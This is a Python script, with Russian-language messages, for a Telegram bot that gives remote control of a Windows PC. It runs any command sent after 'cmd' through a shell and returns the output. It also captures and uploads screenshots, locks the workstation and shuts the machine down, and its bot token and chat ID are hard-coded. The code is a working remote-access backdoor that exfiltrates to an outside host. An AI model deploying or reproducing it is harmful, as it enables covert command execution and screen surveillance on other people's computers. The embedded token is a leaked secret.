import os
import requests
import time
import subprocess
from io import BytesIO
from PIL import ImageGrab

BOT_TOKEN = "9088325911:AAFQRy4UwnX59zG3gSBiaR6pTtW0kHAr3lg"
CHAT_ID = "8057513929"

def send_message(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": text})
    except: pass

def main():
    last_update_id = None
    send_message("💻 Бот на ПК запущен!")
    
    while True:
        try:
            updates = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"timeout": 100, "offset": last_update_id}).json()
            if "result" in updates:
                for update in updates["result"]:
                    last_update_id = update["update_id"] + 1
                    if "message" in update and "text" in update["message"]:
                        command = update["message"]["text"].replace("/", "")
                        
                        if command.startswith("cmd "):
                            cmd = command[4:]
                            res = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, encoding='cp866')
                            send_message(f"Результат:\n{res[:2000]}")
                            
                        elif command == "screen":
                            img = ImageGrab.grab()
                            buffer = BytesIO()
                            img.save(buffer, format="PNG")
                            buffer.seek(0)
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": buffer})
                            
                        elif command == "lock":
                            os.system("rundll32.exe user32.dll,LockWorkStation")
                            send_message("ПК заблокирован.")
                            
                        elif command == "off":
                            os.system("shutdown /s /t 5")
                            send_message("ПК выключается...")
        except Exception as e:
            print(f"Ошибка: {e}")
        time.sleep(1)

if __name__ == "__main__":
    main()
